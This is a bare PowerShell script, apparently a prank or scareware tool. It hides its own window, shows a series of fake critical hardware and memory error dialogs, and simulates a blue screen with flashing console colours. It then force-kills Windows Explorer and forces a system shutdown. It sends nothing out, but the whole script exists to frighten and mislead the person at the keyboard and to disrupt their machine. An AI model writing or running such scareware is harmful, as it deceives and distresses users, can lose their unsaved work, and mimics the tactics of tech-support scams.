# Hides the PowerShell window
$psWindow = (Get-Process -Id $PID).MainWindowHandle
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern int ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
[WinAPI]::ShowWindow($psWindow, 0)  # Hides PowerShell window

# Function to display fake error message boxes
function Show-Error {
    param (
        [string]$message,
        [string]$title
    )
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
    }
"@ -Language CSharp
    [WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0x10)
}

# Before hidden wait time
Start-Sleep 10

# Fake system crash pop-ups
Show-Error "System Error: Motherboard Short Circuits Detected!" "Critical Hardware Failure"
Start-Sleep 3
Show-Error "Memory instability detected: Windows kernel corruption imminent!" "CRITICAL MEMORY FAULT"
Start-Sleep 5
Show-Error "Water detected on the motherboard. Components are shutting down!" "SYSTEM AT RISK"
Start-Sleep 2

# Fake BSOD sequence (PowerShell becomes visible again)
[WinAPI]::ShowWindow($psWindow, 5)  # Make PowerShell visible again
Write-Host "BSOD..." -ForegroundColor Red

# Simulated Blue Screen using console commands
Start-Process "cmd.exe" -ArgumentList "/c color 1F && mode con cols=80 lines=25 && echo A critical system error has occurred... && timeout 10" -NoNewWindow -Wait

# Fake system instability (flashing colors)
for ($i=0; $i -lt 5; $i++) {
    Start-Process "cmd.exe" -ArgumentList "/c color 4F && echo Memory integrity compromised! && timeout 1" -NoNewWindow -Wait
    Start-Process "cmd.exe" -ArgumentList "/c color 1F && echo Critical Error!" -NoNewWindow -Wait
}

# Fake shutdown sequence
Show-Error "System shutdown required to prevent damage! Immediate wipe recommended!" "FINAL WARNING"
Start-Sleep 3
Stop-Process -Name explorer -Force # Kills Windows Explorer (black screen effect)
Start-Sleep 5
Start-Process "shutdown.exe" -ArgumentList "/s /t 5 /c 'System instability detected! Shutdown required!'" -NoNewWindow -Wait
